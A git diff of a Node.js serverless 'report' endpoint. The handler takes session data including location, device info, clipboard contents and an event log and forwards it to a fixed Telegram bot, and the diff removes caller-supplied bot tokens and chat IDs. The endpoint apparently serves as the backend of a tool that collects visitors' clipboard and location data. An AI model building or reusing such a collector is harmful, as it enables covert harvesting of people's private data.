@@ -64,9 +64,7 @@ module.exports = async (req, res) => {
         location,
         deviceInfo,
         clipboard,
-        eventLog,
-        botToken,
-        chatId
+        eventLog
     } = data;
 
     if (!sessionID) {
@@ -74,8 +72,6 @@ module.exports = async (req, res) => {
         return res.status(400).send('Missing Session ID');
     }
 
-    const finalBotToken = botToken || BOT_TOKEN_EXIT;
-    const finalChatId = chatId || CHAT_ID;
 
     try {
         const brandingLink = `<a href="https://omeryigitler.com/assets/logo.png">&#x200b;</a>`;
@@ -100,8 +96,8 @@ module.exports = async (req, res) => {
 
         let telegramSent = false;
         try {
-            await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
-                chat_id: finalChatId,
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN_EXIT}/sendMessage`, {
+                chat_id: CHAT_ID,
                 text: telegramMsg.substring(0, 4090),
                 parse_mode: 'HTML',
                 disable_web_page_preview: false
@@ -127,7 +123,7 @@ module.exports = async (req, res) => {
 
         return res.status(200).json({ success: true, telegramSent });
     } catch (error) {
-        console.error("Report API Error:", error);
+        console.error("Report API Error:", error?.response?.status || "request failed");
         return res.status(500).json({ error: error.message });
     }
 };
